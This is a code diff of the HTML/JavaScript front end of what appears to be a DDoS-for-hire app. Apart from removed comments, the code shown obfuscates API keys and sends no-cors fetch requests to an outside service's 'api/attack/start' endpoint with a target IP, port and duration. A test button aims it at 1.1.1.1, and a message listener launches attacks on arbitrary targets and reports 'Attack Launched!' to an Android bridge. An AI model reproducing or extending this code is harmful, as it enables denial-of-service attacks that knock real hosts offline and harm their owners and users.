@@ -117,7 +117,6 @@
     </div>
 
     <script>
-        // SECURITY: API Keys XOR + Base64 Obfuscation
         const SECRET_SALT = "VeilSecure2024"; 
 
         function encryptKey(key) {
@@ -214,18 +213,14 @@
             } catch(e) {}
         }
 
-        // NO-CORS DIRECT FETCH (No Proxy)
         async function testApi(apiKey, slotNumber) {
             const resDiv = document.getElementById('apiTestResult');
             resDiv.innerHTML = `<span style="color:#00e5ff;">𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐒𝐥𝐨𝐭 ${slotNumber}... 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.</span>`;
             const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=1.1.1.1&port=80&time=10`;
             
             try {
-                // direct no-cors call
                 await fetch(targetUrl, { mode: 'no-cors' });
-                
-                // Since we can't read response due to CORS, we assume success if no network exception
-                resDiv.innerHTML = `<span class="green">☑️ 𝐀𝐏𝐈 𝐓𝐄𝐒𝐓 𝐏𝐀𝐒𝐒 (𝐒𝐥𝐨𝐭 ${slotNumber} 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞)</span><br><small>Request sent to API successfully.</small>`;
+                resDiv.innerHTML = `<span class="green">☑️ 𝐀𝐏𝐈 𝐓𝐄𝐒𝐓 𝐏𝐀𝐒𝐒 (𝐒𝐥𝐨𝐭 ${slotNumber} 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞)</span><br><small>Request sent to API successfully (No-CORS).</small>`;
             } catch (error) {
                 resDiv.innerHTML = `<span class="red">❌ 𝐀𝐏𝐈 𝐓𝐄𝐒𝐓 𝐅𝐀𝐈𝐋 (𝐍𝐞𝐭𝐰𝐨𝐫𝐤 𝐄𝐫𝐫𝐨𝐫)</span>`;
             }
@@ -364,9 +359,6 @@
             }
         }
 
-        // ==========================================
-        // REAL APP CONNECTION LOGIC (NO-CORS DIRECT)
-        // ==========================================
         window.addEventListener("message", async function(event) {
             if (event.data && event.data.action === "ATTACK") {
                 const { ip, port, duration } = event.data;
@@ -399,10 +391,8 @@
 
                     const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=${ip}&port=${port}&time=${duration}`;
                     
-                    // Direct hit without proxy blocking!
                     await fetch(targetUrl, { mode: 'no-cors' });
                     
-                    // Success response to app
                     Android.onAttackResponse("SUCCESS", "Attack Launched!");
 
                 } catch(e) {
